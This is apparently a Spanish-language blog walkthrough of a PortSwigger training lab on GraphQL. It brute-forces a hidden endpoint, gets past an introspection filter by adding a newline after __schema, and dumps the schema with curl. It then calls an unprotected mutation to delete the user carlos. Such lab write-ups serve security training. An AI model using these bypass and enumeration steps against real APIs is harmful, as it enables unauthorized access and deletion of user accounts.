---
title: Finding a hidden GraphQL endpoint
description: Laboratorio de Portswigger sobre GraphQL API Vulnerabilities
date: 2025-02-27 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - GraphQL API Vulnerabilities
tags:
  - Portswigger Labs
  - GraphQL API Vulnerabilities
  - Finding a hidden GraphQL endpoint
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un `endpoint GraphQL oculto` para las `funciones` de `gestión` de `usuarios`. No podremos `encontrar` este `endpoint` simplemente `navegando` por las `páginas` de la `web`. Además, el `endpoint` cuenta con `defensas` contra la `introspección`. Para `resolver` el `laboratorio`, debemos `encontrar` el `endpoint oculto` y `eliminar` al `usuario carlos`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_1.png)

Los `servicios GraphQL` suelen utilizar `endpoints` similares a estos. En `Hacktricks` [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#graphql](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#graphql) se nos explica paso por paso la forma en la que debemos `enumerar` este `servicio`

```
/graphql  
/api  
/apigraphql  
/graphqlapi  
/graphqlgraphql
```

Si los `endpoints` anteriores `no devuelven respuesta` podemos añadirles `/v1`

```
/graphql/v1  
/api/v1  
/apigraphql/v1  
/graphqlapi/v1  
/graphqlgraphql/v1
```

Si hacemos una `petición` a un `endpoint inexistente` obtenemos esta `respuesta`

```
# curl https://0af40067035241d4829e65a9002f00a0.web-security-academy.net/test
"Not Found" 
```

Desde `Burpsuite` vamos a `realizar` un `ataque` de `fuerza bruta` para ver si encontramos alguna `ruta`. Para ello, `capturamos` una `petición` cualquiera, la mandamos al `Intruder` y `señalamos` donde irá el `payload`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_2.png)

Como `payloads` vamos a utilizar las `rutas mencionadas anteriormente`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_3.png)

En la parte inferior `desmarcamos` la `casilla` de `Payload encoding`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_4.png)

Vemos que `/api` nos `devuelve` una `respuesta diferente`, también vemos que devuelve `Allow: GET` y `Content-Type: application/json`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_5.png)

Sin embargo, si hacemos una `consulta` a un `endpoint` que si que `exista` recibiremos un mensaje como `"query not present"` o similar

```
# curl https://0a4e0026033bd4588224665a004b00bc.web-security-academy.net/api   
"Query not present" 
```

Para comprobar que se trata de `GraphQL` podemos usar `universal queries`, si el `content-type` es `x-www-form-urlencoded` podemos usar este payload `query{__typename}` y si el `content-type` es `application/json`, debemos `adaptar` el `payload` a este otro `{"query":"{__typename}"}`. Cuando `enviemos` estos `payloads` se nos devolverá `{"data": {"__typename": "query"}}` en alguna parte de la `respuesta`. La consulta funciona porque cada `endpoint` de `GraphQL` tiene un `campo reservado` llamado `__typename` que `devuelve` el `tipo` del `objeto consultado` como una `cadena`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_6.png)

En la mayoría de casos los `endpoints` en `GraphQL` solo aceptan `peticiones POST` con `content-type` de `application/json` porque esto ayuda a `proteger` contra `vulnerabilidades` de `CSRF`. Sin embargo, en este caso también se pueden `enviar` un `datos` en el `body` de una `petición` por `GET` con `GraphQL`, pero `no se recomienda` porque las `peticiones` por `GET` suelen ser `idempotentes` y utilizan `parámetros` de `consulta`. Sin embargo, algunos `servidores` pueden `permitirlo` por `comodidad`, aunque esto `va en contra de los estándares HTTP`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_7.png)

Para `enumerar información` acerca del `esquema` vamos a usar la `introspección`. La `introspección` es una `función integrada` de `GraphQL` que permite `consultar` un `servidor` para `obtener información` sobre su `esquema`. La `introspección` nos ayuda a comprender cómo podemos `interactuar` con una `API GraphQL`. También puede `revelar datos potencialmente confidenciales`, como `campos` de `descripción`. Para saber si la `introspección` está `habilitada` podemos usamos esta `query`, en este caso al parecer está `deshabilitada`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_8.png)

Si las `consultas` de `introspección` están siendo `bloqueadas` por la `API` que estamos probando, podemos intentar `insertar un carácter especial después de la palabra clave __schema`. `Cuando los desarrolladores desactivan la introspección, podemos usar una expresión regular para excluir la palabra clave __schema en las consultas`. Se recomienda probar con caracteres como `espacios`, `saltos de línea` y `comas`, ya que `GraphQL` los `ignora`, pero las `expresiones regulares no`. En este caso `añadiendo un salto de línea después de __schema logramos bypassear la expresión regular` pero si esto no hubiera funcionado, podríamos intentar `enviar` el `payload` mediante un `método de solicitud alternativo`, ya que la `introspección` solo se puede `desactivar` para el `método POST`. Podríamos probar una solicitud `GET` o una solicitud `POST` con un tipo de contenido de `x-www-form-urlencoded`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_9.png)

Mediante esta `query` podemos `extraer` todos los `tipos`, sus `campos`, sus `argumentos` y el `tipo` de los `argumentos`

```
# curl -s -X GET https://0a5a00a3040cd9a6836b022400360015.web-security-academy.net/api -H "Content-Type: application/json" -d '{"query":"{__schema\n{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}"}' | jq     
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "DeleteOrganizationUserInput",
          "fields": null
        },
        {
          "name": "DeleteOrganizationUserResponse",
          "fields": [
            {
              "name": "user",
              "args": []
            }
          ]
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "User",
          "fields": [
            {
              "name": "id",
              "args": []
            },
            {
              "name": "username",
              "args": []
            }
          ]
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "isRepeatable",
              "args": []
            },
            {
              "name": "locations",
              "args": []
            },
            {
              "name": "args",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "isDeprecated",
              "args": []
            },
            {
              "name": "deprecationReason",
              "args": []
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "args",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "type",
              "args": []
            },
            {
              "name": "isDeprecated",
              "args": []
            },
            {
              "name": "deprecationReason",
              "args": []
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "type",
              "args": []
            },
            {
              "name": "defaultValue",
              "args": []
            },
            {
              "name": "isDeprecated",
              "args": []
            },
            {
              "name": "deprecationReason",
              "args": []
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "args": []
            },
            {
              "name": "types",
              "args": []
            },
            {
              "name": "queryType",
              "args": []
            },
            {
              "name": "mutationType",
              "args": []
            },
            {
              "name": "directives",
              "args": []
            },
            {
              "name": "subscriptionType",
              "args": []
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "args": []
            },
            {
              "name": "name",
              "args": []
            },
            {
              "name": "description",
              "args": []
            },
            {
              "name": "fields",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "interfaces",
              "args": []
            },
            {
              "name": "possibleTypes",
              "args": []
            },
            {
              "name": "enumValues",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "inputFields",
              "args": [
                {
                  "name": "includeDeprecated",
                  "description": null,
                  "type": {
                    "name": "Boolean",
                    "kind": "SCALAR",
                    "ofType": null
                  }
                }
              ]
            },
            {
              "name": "ofType",
              "args": []
            },
            {
              "name": "specifiedByURL",
              "args": []
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "mutation",
          "fields": [
            {
              "name": "deleteOrganizationUser",
              "args": [
                {
                  "name": "input",
                  "description": null,
                  "type": {
                    "name": "DeleteOrganizationUserInput",
                    "kind": "INPUT_OBJECT",
                    "ofType": null
                  }
                }
              ]
            }
          ]
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getUser",
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "name": null,
                    "kind": "NON_NULL",
                    "ofType": {
                      "name": "Int",
                      "kind": "SCALAR"
                    }
                  }
                }
              ]
            }
          ]
        }
      ]
    }
  }
}
```

Es interesante saber si se van a `mostrar errores`, ya que `aportan información útil`

```
# curl -s -X GET https://0a5a00a3040cd9a6836b022400360015.web-security-academy.net/api -H "Content-Type: application/json" -d '{"query":"{__schema}"}' | jq
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ],
      "message": "Validation error (SubselectionRequired@[__schema]) : Subselection required for type '__Schema!' of field '__schema'"
    }
  ]
}
```

```
# curl -s -X GET https://0a5a00a3040cd9a6836b022400360015.web-security-academy.net/api -H "Content-Type: application/json" -d '{"query":"{}"}' | jq             
{
  "errors": [
    {
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ],
      "message": "Invalid syntax with offending token '}' at line 1 column 2"
    }
  ]
}
```

```
# curl -s -X GET https://0a5a00a3040cd9a6836b022400360015.web-security-academy.net/api -H "Content-Type: application/json" -d '{"query":"{thisdefinitelydoesnotexist}"}' | jq 
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 1,
          "column": 2
        }
      ],
      "message": "Validation error (FieldUndefined@[thisdefinitelydoesnotexist]) : Field 'thisdefinitelydoesnotexist' in type 'query' is undefined"
    }
  ]
}
```

Podemos obtener aún más `información` realizando una `consulta` de `introspección completa` sobre el `endpoint`, esto se hace para poder `obtener` la `mayor cantidad` de `información posible` del `esquema`. Este `consulta devuelve detalles completos sobre todas las consultas, mutaciones, suscripciones, tipos y fragmentos`. Si la `introspección` está `habilitada` pero la `consulta no se ejecuta`, debemos `eliminar` las directivas `onOperation`, `onFragment` y `onField` de la `estructura` de la `consulta`, esto se debe a que `muchos endpoints no aceptan estas directivas como parte de una consulta de introspección`

```
#Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

Para `realizar` la `query anterior` debemos `refrescar` la `página`, `capturar` la `petición` con `Burpsuite`, `añadir` un `salto` de `línea` después de `__schema`, `borrar` estas `tres líneas` porque `provocan` un `error`, `pinchar` sobre la `pestaña GraphQL` y `pegar` ahí el `código`

```
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
```

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_10.png)

Podemos `copiar` las `respuestas` de las `queries` en `graphql-visualizer` [http://nathanrandal.com/graphql-visualizer/](http://nathanrandal.com/graphql-visualizer/) o en `graphql-voyager` [https://graphql-kit.com/graphql-voyager/](https://graphql-kit.com/graphql-voyager/) para `ver` los `resultados obtenidos` de forma `gráfica`. En el caso de `graphql-voyager` debemos usar el `payload` que hay en la `web`. Los campos `isPrivate` y `postPassword` son `interesantes`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_11.png)

Para el siguiente paso debemos tener instalada la `extensión InQL`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_12.png)

En este caso no podemos pulsar `click derecho` y `Generate queries with InQL Scanner` porque nos daría un `error`. Esto es debido a las `medidas` de `seguridad`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_13.png)

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_14.png)

Lo que debemos de hacer es `crearnos` un `archivo .json` con el `output` de la `introspección completa` y `cargarlo` desde la `extensión InQL`. Una vez tengamos el archivo cargado pulsamos en `Analyze`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_15.png)

Observamos que hay una `query` que nos permite `enumerar usuarios`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_16.png)

En cuanto a `mutations` se refiere hay una que nos permite `eliminar usuarios`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_17.png)

`Obtenemos` que el `usuario` con `id=3` es `carlos`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_18.png)

Si `copiamos` la `mutation` y `enviamos` la `petición` nos dice que necesitamos `enviar` un `objeto`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_19.png)

`Los objetos en GraphQL van entre llaves {}`, hemos añadido las llaves pero `falta que añadamos los campos de ese objeto`. Por eso nos dice que es `necesario` que `añadamos` el `campo id`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_20.png)

`Añadimos el campo id con el valor de 3`, el cual hace `referencia` al usuarios `carlos`, `enviamos` la `petición` y `borramos` al usuario `carlos`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_21.png)

Podríamos obtener el mismo resultado usando las `herramientas` que nos proporciona el propio `Burpsuite` para `GraphQL`. Si la `API` acepta el método `GET` debemos mandar el `payload` por `GET` y si acepta el método `POST` hay que mandar el `payload` por `POST`, de lo contrario la herramienta que nos proporciona `Burpsuite` para `interactuar` con `GraphQL` no se podrá usar. El primer para es mandar un `query` por `GET` y `comprobar` que `funciona`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_22.png)

Lo siguiente que debemos hacer es hacer `click izquierdo` en la ventana `Request` y pulsar `Set introspection query`. Estos son `payloads` que nos proporciona el propio `Burpsuite` para `analizar GraphQL`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_23.png)

Se nos `generará` este `payload`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_24.png)

Si `enviamos` el `payload` nos `arrojará` un `error`, porque `hay medidas de seguridad nos impiden llevar a cabo la introspección`. En este caso es una `expresión regular`, para `bypassearla` debemos `añadir un salto de línea después de __schema` al igual que hemos hecho anteriormente

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_25.png)

Hacemos `click izquierdo` nuevamente y pulsamos sobre `Save GraphQL queries to site map`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_26.png)

Nos dirigimos a `Target > Site map` y vemos que tenemos `dos peticiones interesantes`, una para `identificar usuarios` y la otra para `eliminarlos`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_27.png)

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_28.png)

`Identificamos` al usuario `carlos`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_29.png)

`Borramos` al usuario `carlos`

![](/assets/img/GraphQL-API-Vulnerabilities-Lab-3/image_30.png)



